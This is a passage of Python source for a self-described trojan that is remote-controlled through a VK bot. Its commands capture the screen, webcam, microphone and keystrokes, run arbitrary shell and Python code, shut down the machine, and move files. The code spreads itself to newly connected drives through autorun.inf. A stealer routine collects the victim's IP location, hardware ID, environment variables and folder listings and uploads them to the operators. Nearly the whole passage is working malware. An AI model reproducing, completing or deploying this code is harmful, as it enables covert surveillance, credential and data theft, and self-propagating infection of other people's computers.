            return f"Directory {_arguments} does not exists!"


def command_location(_arguments, _event) -> str:
    # @function command_location()
    # @returns str
    # @description Function for command "location" that returns location of the PC.

    # Getting ip data.
    _ip = get_ip()

    if "ip" in _ip and "city" in _ip and "country" in _ip and "region" in _ip and "org" in _ip:
        # If correct fields.

        # Getting ip data.
        _ipaddress = _ip["ip"]  # noqa
        _ipcity = _ip["city"]  # noqa
        _ipcountry = _ip["country"]  # noqa
        _ipregion = _ip["region"]  # noqa
        _ipprovider = _ip["org"]  # noqa

        # Returning.
        return f"IP: {_ipaddress}," \
               f"\nCountry: {_ipcountry}," \
               f"\nRegion: {_ipregion}," \
               f"\nCity: {_ipcity}," \
               f"\nProvider: {_ipprovider}."
    else:
        # If not valid fields.

        # Returning error.
        return "Couldn't get location"


def command_microphone(_arguments, _event) -> list:
    # @function command_microphone()
    # @returns str
    # @description Function for command "microphone" that returns voice message with the microphone.

    try:
        # Trying to import modules.

        # Importing.
        import pyaudio
        import wave
    except ImportError:
        # If there is import error.

        # Not supported.
        return "This command does not supported on selected PC! (pyaduio/wave module is not installed)"  # noqa

    # Getting path.
    _path = __FOLDER + "Microphone.wav"

    # Recording.
    record_microphone(_path, _arguments)

    # Message with uploading.
    return [_path, "Microphone", "audio_message"]


def command_help(_arguments, _event) -> str:
    # @function command_help()
    # @returns str
    # @description Function for command "help" that returns list of all commands.

    # Returning.
    return str(__COMMANDS_HELP)  # noqa


def command_tags_new(_arguments, _event) -> str:
    # @function command_tags_new()
    # @returns str
    # @description Function for command "tags_new" that replaces tags.

    # Globalising tags
    global __TAGS

    # Clearing tags list.
    __TAGS = []

    # Getting arguments.
    _arguments = _arguments.split(";")

    if len(_arguments) == 0:
        # If no arguments.

        # Message.
        return "Incorrect arguments! Example: (tags separated by ;)"

    # Tags that was added.
    _new_tags = []

    for _tag in _arguments:
        # For tags in arguments.

        # Getting clean tag.
        _clean_tag = _tag.replace(" ", "-")

        # Adding it.
        _new_tags.append(_clean_tag)

    if len(_new_tags) != 0:
        # If tags was added.

        # Replacing tags.
        __TAGS = []

        # Adding new tags
        __TAGS.extend(_new_tags)

        # Saving tags.
        save_tags()

        # Message.
        return f"Added new tags: {_new_tags}"
    else:
        # Message.
        return "Replacing was not completed! No tags passed!"


def command_tags_add(_arguments: str, _event) -> str:
    # @function command_tags_add()
    # @returns str
    # @description Function for command "tags_add" that add tags.

    # Getting arguments.
    _arguments = _arguments.split(";")

    if len(_arguments) == 0:
        # If no arguments.

        # Message.
        return "Incorrect arguments! Example: (tags separated by ;)"

    # Globalising tags.
    global __TAGS

    # Tags that was added.
    _new_tags = []

    for _tag in _arguments:
        # For tags in arguments.

        # Getting clean tag.
        _clean_tag = _tag.replace(" ", "-")

        # Adding it.
        __TAGS.append(_clean_tag)
        _new_tags.append(_clean_tag)

    # Saving tags.
    save_tags()

    # Message.
    return f"Added new tags: {_new_tags}"


def command_message(_arguments: str, _event) -> str:
    # @function command_message()
    # @returns str
    # @description Function for command "message" that shows message.

    try:
        # Trying to import module.

        # Importing module.
        import ctypes
    except ImportError:
        # If there is import error.

        # Not supported.
        return "This command does not supported on selected PC! (ctypes module is not installed)"  # noqa

    # Getting arguments.
    _arguments = _arguments.split(";")

    # Passing arguments.
    if len(_arguments) == 0:
        # If there is no arguments.

        # Message
        return "Incorrect arguments! Example: text;title;data"

    if len(_arguments) == 1:
        # If there is only text.

        # Adding title.
        _arguments.append("")

    if len(_arguments) == 2:
        # If there is only text and title.

        # Adding title.
        _arguments.append(0x00000010)  # noqa

    # Calling message.
    try:
        # Trying to show message.

        # Showing.
        ctypes.windll.user32.MessageBoxW(0, _arguments[0], _arguments[1], _arguments[2])
    except Exception as _exception:  # noqa
        # If there is error.

        # Message.
        return f"Error when showing message! Error: {_exception}"

    # Message.
    return "Message was closed!"


def command_webcam(_arguments, _event) -> list:
    # @function command_webcam()
    # @returns list
    # @description Function for command "webcam" that returns webcam photo.

    try:
        # Trying to import opencv-python.

        # Importing.
        import cv2
    except ImportError:
        # If there is import error.

        # Not supported.
        return "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)"  # noqa

    # Globalising folder.
    global __FOLDER

    # Getting camera.
    _camera = cv2.VideoCapture(0)

    # Getting image.
    _, _image = _camera.read()

    # Getting path.
    _path = __FOLDER + "webcam.png"

    # Building path.
    filesystem_build_path(_path)

    # Writing file.
    cv2.imwrite(_path, _image)

    # Deleting camera.
    del _camera

    # Returning uploading.
    return [_path, "Webcam", "photo"]


def command_screenshot(_arguments, _event) -> list:
    # @function command_screenshot()
    # @returns list
    # @description Function for command "screenshot" that returns screenshot.

    try:
        # Trying to import.

        # Importing.
        import PIL.ImageGrab
    except ImportError:
        # If there is import error.

        # Not supported.
        return "This command does not supported on selected PC! (Pillow module is not installed)"  # noqa

    # Taking screenshot.
    screenshot = PIL.ImageGrab.grab()

    # Getting path.
    _path = __FOLDER + "Screenshot.jpg"

    # Saving it.
    screenshot.save(_path)

    # Message with uploading.
    return [_path, "Screenshot", "photo"]


def command_python(_arguments, _event) -> str:
    # @function command_python()
    # @returns str
    # @description Function for command "python" that executes python code.

    # Executing.
    return execute_python(_arguments, globals(), locals())


def command_tags(_arguments, _event) -> str:
    # @function command_tags()
    # @returns str
    # @description Function for command "tags" that returns all tags.

    # Globalising tags.
    global __TAGS

    # Returning.
    return str(", ".join(__TAGS))


def command_version(_arguments, _event) -> str:
    # @function command_version()
    # @returns str
    # @description Function for command "version" that returns current version.

    # Returning.
    return VERSION


def command_name_new(_arguments, _event) -> str:
    # @function command_name_new()
    # @returns str
    # @description Function for command "name_new" that changes name to other.

    # Global name.
    global __NAME

    if type(_arguments) == str and len(_arguments) > 0:
        # If correct arguments.

        # Changing name.
        __NAME = _arguments

        # Saving name
        save_name()
        # Returning.
        return f"Name changed to {__NAME}"
    else:
        # If name is not valid.

        # Returning.
        return f"Invalid name!"


def command_exit(_arguments, _event) -> str:
    # @function command_exit()
    # @returns str
    # @description Function for command "exit" that exits malware.

    # Exiting.
    raise SystemExit


def command_shutdown(_arguments, _event) -> str:
    # @function command_shutdown()
    # @returns str
    # @description Function for command "shutdown" that shutdowns PC.

    # Shutdown.
    os.system("shutdown /s /t 0")

    # Message.
    return "System was shutdown..."


def command_restart(_arguments, _event) -> str:
    # @function command_restart()
    # @returns str
    # @description Function for command "restart" that restarts PC.

    # Restarting.
    os.system("shutdown /r /t 0")

    # Message.
    return "System was restarted..."


def command_console(_arguments, _event) -> str:
    # @function command_console()
    # @returns str
    # @description Function for command "console" that executes console command.

    # Executing system and returning result.
    return str(os.system(_arguments))


def command_destruct(_arguments, _event) -> str:
    # @function command_destruct()
    # @returns str
    # @description Function for command "destruct" that destroys self from the system.

    # Unregistering from the autorun.
    autorun_register()

    # Exiting.
    return command_exit(_arguments)


def command_keylog(_arguments, _event) -> str:
    # @function command_keylog()
    # @returns str
    # @description Function for command "keylog" that returns keylog string.

    # Globalise keylog.
    global __KEYLOG

    # Returning.
    return __KEYLOG


def command_link(_arguments, _event) -> str:
    # @function command_link()
    # @returns str
    # @description Function for command "link" that opens link in the browser.

    try:
        # Trying to open with the module.

        # Importing module.
        import webbrowser

        # Opening link.
        webbrowser.open(_arguments)

        # Message.
        return "Link was opened (Via module)!"
    except ImportError:
        # If there is ImportError.

        # Opening with system.
        os.system("open {_arguments}")

        # Message.
        return "Link was opened (Via system)!"


def command_drives(_arguments: str, _event) -> str:
    # @function command_drives()
    # @returns None
    # @description Function for command "drive" that returns list of the all drives in the system separated by ,(comma).

    # Returning.
    return ", ".join(filesystem_get_drives_list())


def executable_get_extension() -> str:
    # @function executable_get_extension()
    # @returns str
    # @description Function that return extension of the current executable file.

    return sys.argv[0].split('.')[-1]


def filesystem_build_path(_path: str) -> None:
    # @function filesystem_build_path()
    # @returns None
    # @description Function that builds path to the file.

    try:
        # Trying to build path.

        # Getting path elements (split by \\)
        _path = _path.split("\\")

        # Removing last element (filename)
        _path.pop()

        # Converting back to the string
        _path = "\\".join(_path)

        if not os.path.exists(_path):
            # If path not exists.

            # Making directories.
            os.makedirs(_path)
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function filesystem_build_path()! "
                      f"Full exception information - {_exception}")


def spreading_infect_drive(_drive: str) -> None:
    # @function spreading_infect_drive()
    # @returns list
    # @description Function that infects drive with given symbol.

    # TODO: Make autorun folder hidden.

    if SPREADING_INFECTION_DISABLED:
        # If infection disabled.

        # Returning.
        return

    try:
        # Trying to infect drive.

        if _drive in SPREADING_SKIPPED_DRIVES:
            # If this drive in skipped drives.

            # Returning and not infecting.
            return

        # Getting executable path.
        _executable_path = "autorun\\autorun." + executable_get_extension()

        if not os.path.exists(_drive + _executable_path):
            # If no executable file there (Not infected already).

            # Building path.
            filesystem_build_path(_drive + _executable_path)

            # Copying executable there.
            shutil.copyfile(sys.argv[0], _drive + _executable_path)

            # Writing autorun.inf file.
            with open(_drive + "autorun.inf", "w") as _autorun:
                # Opening file.

                # Writing.
                _autorun.write(f"[AutoRun]\nopen={_executable_path}\naction=Autorun\\Autorun")
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function spreading_infect_drive()! "
                      f"Full exception information - {_exception}")


def list_difference(_list_one, _list_two) -> list:
    # @function list_difference()
    # @returns list
    # @description Function that returns list with difference between two given lists.

    # Returning.
    return [i for i in _list_one if i not in _list_two]


def filesystem_get_drives_list() -> list:
    # @function filesystem_get_drives_list()
    # @returns list
    # @description Function that returns list of the all drives in the system.

    try:
        # Getting drive letters.
        _drives_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

        # Returning list.
        return ["%s:\\\\" % _drive_letter for _drive_letter in _drives_letters
                if os.path.exists('%s:\\\\' % _drive_letter)]
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function filesystem_get_drives_list()! "
                      f"Full exception information - {_exception}")


def spreading_thread() -> None:
    # @function spreading_thread()
    # @returns None
    # @description Function for thread of the spreading, spreads virus.

    try:
        # Trying to spread.

        # Getting list of the all current drives.
        _current_drives = filesystem_get_drives_list()

        while True:
            # Infinity loop.

            # Getting latest drives list.
            _latest_drives = filesystem_get_drives_list()

            # Getting connected and disconnected drives.
            _connected_drives = list_difference(_latest_drives, _current_drives)
            _disconnected_drives = list_difference(_current_drives, _latest_drives)

            # Processing connecting of the drives.
            if _connected_drives:
                # Notifying server about connecting and infecting.
                for _drive in _connected_drives:
                    # For every drive in connected drives.

                    # Server message.
                    server_message(f"[Spreading] Connected drive {_drive}!")
                    debug_message(f"[Spreading] Connected drive {_drive}!")

                    # Infecting drive.
                    spreading_infect_drive(_drive)

            # Processing disconnecting of the drives.
            if _disconnected_drives:
                # Notifying server about disconnecting.

                for _drive in _disconnected_drives:
                    # For every drive in disconnected drives.

                    # Server message.
                    server_message(f"[Spreading] Disconnected drive {_drive}!")
                    debug_message(f"[Spreading] Disconnected drive {_drive}!")

            # Updating current drives.
            _current_drives = filesystem_get_drives_list()

    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function spreading_thread()! "
                      f"Full exception information - {_exception}")


def spreading_start() -> None:
    # @function spreading_start()
    # @returns None
    # @description Function that starts malware spreading.

    if SPREADING_DISABLED:
        # If spreading is disabled.

        # Returning.
        return

    # Starting listening drives.
    threading.Thread(target=spreading_thread).start()


def set_folder_path() -> None:
    # @function set_folder_path()
    # @returns None
    # @description Function that set folder path for the malware.

    # Globalize folder variable.
    global __FOLDER

    # Setting folder.
    __FOLDER = os.getenv('APPDATA') + "\\Adobe\\"


def get_folder_path() -> str:
    # @function get_folder_path()
    # @returns str
    # @description Function that returns folder path for the malware.

    # Globalize folder variable.
    global __FOLDER

    # Returning folder.
    return __FOLDER


def assert_operating_system() -> None:
    # @function assert_operating_system()
    # @returns None
    # @description Function that asserting that operating system,
    # @description on which current instance of the trojan is launched are supported.

    # Tuple with all platforms (NOT OPERATING SYSTEM) that are supported for the malware.
    _supported_platforms = ("win32", "linux")

    # Tuple with all platforms (NOT OPERATING SYSTEM) that are only partially supported,
    # and just showing debug message for the it.
    _development_platforms = ("linux",)

    for _platform in _supported_platforms:
        # Iterating over all platforms in the supported platforms.

        if sys.platform.startswith(_platform):
            # If current PC is have this platform (Supported).

            if _platform in _development_platforms:
                # If this is development platform.

                # Showing debug message.
                debug_message("You are currently running this malware on platform {_platform} "
                              "which is not fully supported!")

            # Returning from the function as current platform is supported.
            return

    # Code lines below only executes if code above don't found supported platform.

    # Debug message.
    debug_message("Oops... You are running malware on the platform "
                  "{sys.platform} which is not supported! Sorry for that!")

    # Raising SystemExit (Exiting code)
    raise SystemExit


def keylogger_start() -> None:
    # @function keylogger_start()
    # @returns None
    # @description Function that starts keylogger (Setting callback for on release keyboard function).

    if KEYLOGGER_DISABLED:
        # If keylogger is disabled.

        # Returning.
        return

    try:
        # Trying to import keyboard module which is not preinstalled.

        # Importing keyboard module.
        import keyboard
    except ImportError:
        # If there is ImportError occurred.

        # Debug message.
        debug_message("Oops... Not started keylogger as there is no module with name \"keyboard\"!")

        # Returning and not starting keylogger.
        return

    # Setting keyboard on release trigger to our callback event function.
    keyboard.on_release(callback=keylogger_callback_event)

    # Debug message.
    debug_message("[Keylogger] Started! ")


def keylogger_callback_event(_keyboard_event):
    # @function keylogger_callback_event()
    # @returns None
    # @description Function that process keylogger callback event for key released.

    try:
        # Getting keyboard key from the keyboard event.
        _keyboard_key = str(_keyboard_event.name)

        # Globalising keylog string.
        global __KEYLOG

        if type(_keyboard_key) == str:
            # If this is string.
            if len(_keyboard_key) > 1:
                # If this is not the only 1 char.

                if _keyboard_key == "space":
                    # If this is space key.

                    # Adding space.
                    __KEYLOG = " "
                elif _keyboard_key == "enter":
                    # If this enter key.

                    # Adding newline.
                    __KEYLOG = "\n"
                elif _keyboard_key == "decimal":
                    # If this is decimal key.

                    # Adding dot.
                    __KEYLOG = "."
                elif _keyboard_key == "backspace":
                    # If this is backspace key.

                    # Deleting from the keylog.
                    __KEYLOG = __KEYLOG[:-1]
                else:
                    # If this is some other key.

                    # Formatting key.
                    _keyboard_key = _keyboard_key.replace(" ", "_").upper()

                    # Adding it to the keylog.
                    __KEYLOG = f"[{_keyboard_key}]"
            else:
                # If this is only 1 char.

                # Adding key (char) to the keylogger string.
                __KEYLOG += _keyboard_key
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function keylogger_callback_event()! "
                      f"Full exception information - {_exception}")


def initialise_commands() -> None:
    # @function initialise_commands()
    # @returns None
    # @description Function that initialises commands.

    # Globalising command functions and help.

    global __COMMANDS_FUNCTION
    global __COMMANDS_HELP

    # Commands function.
    __COMMANDS_FUNCTION = {
        "screenshot": command_screenshot,
        "webcam": command_webcam,
        "microphone": command_microphone,
        "help": command_help,
        "version": command_version,
        "tags": command_tags,
        "location": command_location,
        "keylog": command_keylog,
        "cd": command_cd,
        "ls": command_ls,
        "drives": command_drives,
        "tags_new": command_tags_new,
        "tags_add": command_tags_add,
        "shutdown": command_shutdown,
        "restart": command_restart,
        "console": command_console,
        "upload": command_upload,
        "ddos": command_ddos,
        "link": command_link,
        "name_new": command_name_new,
        "exit": command_exit,
        "python": command_python,
        "message": command_message,
        "destruct": command_destruct,
        "download": command_download,
        "properties": command_properties
    }

    __COMMANDS_HELP = {
        "download": (
            "Downloads file from the victim client.",
            "download [required]PATH"
        ),
        "screenshot": (
            "Returns you an photo (screenshot) from screen of the victim.",
            "screenshot"
        ),
        "webcam": (
            "Returns you an photo from webcam of the victim (Only if it connected to the PC).",
            "webcam"
        ),
        "microphone": (
            "Returns you an voice message from microphone of the victim, "
            "for that amount of the seconds that you specify (Only if it connected to the PC).",
            "microphone [optional, default is 1]SECONDS"
        ),
        "help": (
            "Returns list of the all commands in the malware, "
            "if you specify command, shows documentation to given command itself.",
            "help [optional]COMMAND"
        ),
        "version": (
            "Returns current version of the malware instance that is currently running on the victim PC "
            "(That is get this command).",
            "version"
        ),
        "tags": (
            "Returns an list separated by ,(comma) of the all tags that have called instance of the malware.",
            "tags"
        ),
        "location": (
            "Returns location (fully not very precise) of the victim (Gets throughout IP).", "location"
        ),
        "keylog": (
            "Returns log of the keylogger.",
            "keylog"
        ),
        "cd": (
            "Changes directory of the files commands, if you don't specify directory, this will show it"
            "(Write only name of directory in current directory or full path itself).",
            "cd [optional]DIRECTORY"
        ),
        "ls": (
            "Returns list of the files in current directory (Or directory that you specify) separated by ,(comma).",
            "ls"
        ),
        "drives": (
            "Returns list of the all drives in the system separated by ,(comma)"
            "drives"
        ),
        "tags_new": (
            "Replaces all old tags with these new."
            "tags_new [required]TAGS(Separated by;)"
        ),
        "tags_add": (
            "Adds given tags to all other tags.",
            "tags_add [required]TAGS(Separated by ;)"
        ),
        "shutdown": (
            "Shutdowns victim PC.",
            "shutdown"
        ),
        "restart": (
            "Restarts victim PC.",
            "restart"
        ),
        "console": (
            "Executes console command and returns it code (0 if all OK)",
            "console"
        ),
        "ddos": (
            "Pings given address",
            "ddos [required]ADDRESS"
        ),
        "link": (
            "Opens link in a victim browser.",
            "link [required]URI"
        ),
        "name_new": (
            "Replaces old name with this name",
            "name_new [required]NAME"
        ),
        "exit": (
            "Exits malware (Will be launched when PC is restarted)",
            "exit"
        ),
        "python": (
            "Executes python code, if you want to get output write - global out "
            "out = \"Hello World!\" and this is gonna be shown.",
            "python [required]CODE"
        ),
        "message": (
            "Shows message to the user.",
            "message [required]TEXT;TITLE[optional];CODE[optional]"
        ),
        "destruct": (
            "Delete malware from the system (Removing from the autorun and closing)",
            "destruct"
        )
    }


def exit_handler() -> None:
    # @function exit_handler()
    # @returns None
    # @description Function that handles exit of the malware.

    # Debug message.
    debug_message("Exiting malware!")

    # Sever message.
    server_message(f"Disconnected from the network!")


def server_connect() -> None:
    # @function server_connect()
    # @returns None
    # @description Function that connects to the server.

    # Globalising variables.
    global __SERVER_API
    global __SERVER_BOT

    try:
        # Trying to connect to server.

        __SERVER_API = vk_api.VkApi(token=SERVER_TOKEN)
        __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, SERVER_GROUP)
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function server_connect()! "
                      f"Full exception information - {_exception}")

        # Exiting.
        raise SystemExit


def debug_message(_message: str) -> None:
    # @function debug_message()
    # @returns None
    # @description Function that shows debug message if debug message is enabled.

    if not DEBUG:
        # If debug is not enabled.

        # Returning.
        return

    # Printing message.
    print(_message)


def get_operating_system() -> str:
    # @function get_operating_system()
    # @returns str
    # @description Function that return current operating system.

    if sys.platform.startswith('win32'):
        # If this is windows.

        # Returning windows.
        return "Windows"

    if sys.platform.startswith('linux'):
        # If this is linux.

        # Returning linux.
        return "Linux"

    # Unsupported operating system
    return "!UNSUPPORTED_OS!"


def server_listen() -> None:
    # @function server_listen()
    # @returns None
    # @description Function that listen server for the new message.

    if __SERVER_BOT is None:
        # If server bot is none.

        # Returning.
        return

    while True:
        # Infinity loop.

        try:
            # Trying to listen.

            for _event in __SERVER_BOT.listen():  # noqa
                # For every message event in the server bot listening.

                if _event.type == vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW:
                    # If this is message event.

                    # Processing client-server answer.
                    client_answer_server(_event)
        except Exception as _exception:  # noqa
            # If there is exception occurred.

            # Showing debug message to the developer.
            debug_message(f"Oops... Exception occurred in function server_listen()! "
                          f"Full exception information - {_exception}")


def load_tags() -> None:
    # @function load_tags()
    # @returns None
    # @description Function that loads all tags data.

    # Globalising tags.
    global __TAGS

    try:
        # Trying to load tags.

        # Getting path.
        _path = __FOLDER + "tags.dat"

        # Building path.
        filesystem_build_path(_path)

        if os.path.exists(_path):
            # If we have tags file.

            try:
                # Trying to read tags.

                # Clearing tags list.
                __TAGS = []

                with open(_path, "r", encoding="UTF-8") as _tf:
                    # With opened file.

                    # Reading tags.
                    __TAGS = eval(_tf.read())
            except Exception as _exception:  # noqa
                # If there is exception occurred.

                # Debug message.
                debug_message(f"Can`t load tags file! Exception: {_exception}")

                # Tags list.
                __TAGS = [get_ip()["ip"], get_operating_system(), "PC"]  # noqa

                if not DISABLE_HWID:
                    # If we don't disable HWID.

                    # Adding HWID.
                    __TAGS.append(get_hwid())

                # Saving tags.
                save_tags()
        else:
            # If we don't have tags file.

            # Tags list.
            __TAGS = [get_ip()["ip"], get_operating_system(), "PC"]  # noqa

            if not DISABLE_HWID:
                # If we don't disable HWID.

                # Adding HWID.
                __TAGS.append(get_hwid())

            # Saving tags.
            save_tags()
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function load_tags()! "
                      f"Full exception information - {_exception}")

        # Settings default PC + LOAD_TAGS_ERROR tags.
        __TAGS = ["PC", "LOAD_TAGS_ERROR"]


def get_hwid() -> str:
    # @function get_hwid()
    # @returns str
    # @description Function that return unique hardware index.

    # Default HWID.
    _DEFAULT = "00000000-0000-0000-0000-000000000000"

    try:
        # Trying to get HWID

        # Command to execute.
        _command = "wmic csproduct get uuid"

        # Opening process.
        _process = subprocess.Popen(_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)

        # Returning HWID.
        return str((_process.stdout.read() + _process.stderr.read()).decode().split("\n")[1])
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function get_hwid()! "
                      f"Full exception information - {_exception}")

        # Returning default.
        return _DEFAULT


def get_ip():
    # @function get_ip()
    # @returns Dict
    # @description Function that returns ip address of the victim machine.

    try:
        # Trying to get IP.

        # API Provider.
        _api_provider = "http://ipinfo.io/json"

        # Returning JSON data.
        return requests.get(_api_provider).json()
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function get_ip()! "
                      f"Full exception information - {_exception}")

        # Returning zero-ip.
        return "0.0.0.0.0"


def get_environment_variables() -> dict:
    # @function get_environment_variables()
    # @returns dict
    # @description Function that returns list of the all environment variables in the system.

    # All environment variables.
    _environment_variables = {}

    for _environment_variable in os.environ:
        # For every variable in environ.

        # Adding current variable to all variables
        _environment_variables[_environment_variable] = os.getenv(_environment_variable)

    # Returning variables.
    return _environment_variables


def list_intersects(_list_one: list, _list_two: list) -> bool:
    # @function list_intersects()
    # @returns bool
    # @description Function that returns is two list is intersects or not.

    # Checking intersection.
    for _item in _list_one:
        # For items in list one.

        if _item in _list_two:
            # If item in list two.

            # Return True.
            return True

    # No intersection.
    return False


def parse_tags(_tags: str) -> list:
    # @function parse_tags()
    # @returns list
    # @description Function that returns list from the string of the tags.

    # Returning.
    return _tags.replace("[", "").replace("]", "").split(",")


def save_tags() -> None:
    # @function save_tags()
    # @returns None
    # @description Function that saves tags to the file.

    # Globalising tags.
    global __TAGS

    try:
        # Trying to save tags.

        # Getting path.
        _path = __FOLDER + "tags.dat"

        # Building path.
        filesystem_build_path(_path)

        with open(_path, "w", encoding="UTF-8") as _tf:
            # With opened file.

            # Writing tags.
            _tf.write(str(__TAGS))
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function save_tags()! "
                      f"Full exception information - {_exception}")


def server_method(method: str, parameters: dict, _isretry=False) -> any:
    # @function server_method()
    # @returns any
    # @description Function that calls server method.

    if __SERVER_API is None:
        # If no server API.

        # return.
        return

    try:
        # Trying to call method.

        if "random_id" not in parameters:
            # If there is no random id.

            # Adding random id.
            parameters["random_id"] = vk_api.utils.get_random_id()

        # Executing method.
        return __SERVER_API.method(method, parameters)  # noqa
    except Exception as Error:
        # Error.

        # Message.
        debug_message(f"Ошибка при попытке вызвать метод сервера! Ошибка: {Error}")

        if _isretry:
            # If this is already retry.

            # Returning.
            return
        else:
            # If this is not retry.

            # Retrying.
            return server_method(method, parameters, True)


def server_message(_text: str, _attachmment: str = None, _peer_index: int = None) -> None:
    # @function server_message()
    # @returns any
    # @description Function that sends message to the server.

    # Globalising name.
    global __NAME

    if _peer_index is None:
        # If peer index is not specified.

        for _admin_peer_index in SERVER_ADMINS:
            # For every peer index in admins peer indices.

            # Sending messages to they.
            server_message(_text, _attachmment, _admin_peer_index)

        # Returning.
        return

    # Adding name to the text.
    _text = f"<{__NAME}>\n{_text}"

    # Debug message.
    debug_message("Sent new message!")

    # Calling method.
    server_method("messages.send", {
        "message": _text,
        "attachment": _attachmment,
        "peer_id": _peer_index})


def save_name() -> None:
    # @function save_name()
    # @returns None
    # @description Function that saves name to the file.

    try:
        # Trying to save name.

        # Getting path.
        _path = __FOLDER + "name.dat"

        # Building path.
        filesystem_build_path(_path)

        with open(_path, "w", encoding="UTF-8") as _tf:
            # With opened file.

            # Writing name.
            _tf.write(str(__NAME))
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function save_name()! "
                      f"Full exception information - {_exception}")


def load_name() -> None:
    # @function load_name()
    # @returns None
    # @description Function that loads all name data.

    # Globalising name.
    global __NAME

    try:
        # Trying to load name.

        # Getting path.
        _path = __FOLDER + "name.dat"

        # Building path.
        filesystem_build_path(_path)

        if os.path.exists(_path):
            # If we have name file.

            try:
                # Trying to read name.

                # Clearing name.
                __NAME = ""

                with open(_path, "r", encoding="UTF-8") as _nf:
                    # With opened file.

                    # Reading name.
                    __NAME = str(_nf.read())
            except Exception as _exception:  # noqa
                # If there is exception occurred.

                # Debug message.
                debug_message(f"Can`t load name file! Exception: {_exception}")

                # Name.
                __NAME = get_ip()["ip"]  # noqa

                # Saving name.
                save_name()
        else:
            # If we don't have name file.

            # Name.
            __NAME = get_ip()["ip"]  # noqa

            # Saving name.
            save_name()
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function load_name()! "
                      f"Full exception information - {_exception}")

        # Name.
        __NAME = get_ip()["ip"]  # noqa


def stealer_steal_data(_force: bool = False):
    # @function stealer_steal_data()
    # @returns None
    # @description Function that steals all the data from the victim.

    # Globalising values.
    global __VALUES

    try:
        # Trying to steal.

        if not stealer_is_already_worked() or _force:
            # If we not already stolen data or forcing.

            # Getting file name.
            _path = __FOLDER + "log.json"

            # Getting ip data.
            _ip = get_ip()

            # Getting path data.
            _userprofile = os.getenv("userprofile")
            _drive = os.getcwd().split("\\")[0]

            # Writing values.
            __VALUES["internet_ipaddress"] = _ip["ip"]  # noqa
            __VALUES["internet_city"] = _ip["city"]  # noqa
            __VALUES["internet_country"] = _ip["country"]  # noqa
            __VALUES["internet_region"] = _ip["region"]  # noqa
            __VALUES["internet_provider"] = _ip["org"]  # noqa

            if not DISABLE_HWID:
                # If HWID is not disabled.

                # Writing HWID.
                __VALUES["computer_hardware_index"] = get_hwid()

            if not sys.platform.startswith('linux'):
                # If not linux.

                # Windows values.
                __VALUES["computer_username"] = os.getenv("UserName")
                __VALUES["computer_name"] = os.getenv("COMPUTERNAME")
                __VALUES["computer_operating_system"] = os.getenv("OS")
                __VALUES["computer_processor"] = os.getenv("NUMBER_OF_PROCESSORS") + " cores "
                __VALUES["computer_processor"] += os.getenv("PROCESSOR_ARCHITECTURE") + " "
                __VALUES["computer_processor"] += os.getenv("PROCESSOR_IDENTIFIER") + " "
                __VALUES["computer_processor"] += os.getenv("PROCESSOR_LEVEL") + " "
                __VALUES["computer_processor"] += os.getenv("PROCESSOR_REVISION")
                __VALUES["computer_environment_variables"] = get_environment_variables()
                __VALUES["directory_downloads"] = os.listdir(_userprofile + "\\Downloads")
                __VALUES["directory_documents"] = os.listdir(_userprofile + "\\Documents")
                __VALUES["directory_desktop"] = os.listdir(_userprofile + "\\Desktop")
                __VALUES["directory_root"] = os.listdir(_drive + "\\")
                __VALUES["directory_programfiles"] = os.listdir(_drive + "\\Program Files")
                __VALUES["directory_programfiles86"] = os.listdir(_drive + "\\Program Files (x86)")

            # Building path.
            filesystem_build_path(_path)

            with open(_path, "w") as _file:
                # With opened file.

                # Dumping.
                json.dump(__VALUES, _file, indent=4)

            for _peer in SERVER_ADMINS:
                # For every peer in admins.

                # Uploading document.
                _uploading_result = server_upload_document(_path, "Log File", _peer, "doc")

                # Message.
                if type(_uploading_result) == str:
                    # If all is ok.

                    # Message.
                    server_message(f"[Stealer] Stolen data:", _uploading_result, _peer)
                else:
                    # If there is error.

                    # Message.
                    server_message(f"[Stealer] Error when uploading stolen data: {_uploading_result}", None, _peer)

            # Returning value.
            return __VALUES
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function steal_data()! "
                      f"Full exception information - {_exception}")

        # Returning value.
        return {_exception}


def user_is_admin(_peer: str) -> bool:
    # @function user_is_admin()
    # @returns None
    # @description Function that returns is given user is admin or not.

    if SERVER_ADMINS is None or len(SERVER_ADMINS) == 0:
        # If there is no admins in the list

        # Returning true as there is no admins.
        return True

    # Returning.
    return _peer in SERVER_ADMINS


def client_answer_server(_event) -> None:
    # @function client_answer_server()
    # @returns None
    # @description Function that process message from the remote access (server).

    # Getting text from the event.
    _text = _event.message.text

    # Getting peer from the event.
    _peer = _event.message.peer_id

    # Text of the response.
    _response_text = None

    # Attachment of the response.
    _response_attachment = None

    try:
        # Trying to answer.

        # Getting arguments from the message (Message split by space).
        _message_arguments = _text.split(";")

        if len(_message_arguments) == 0:
            # If empty.

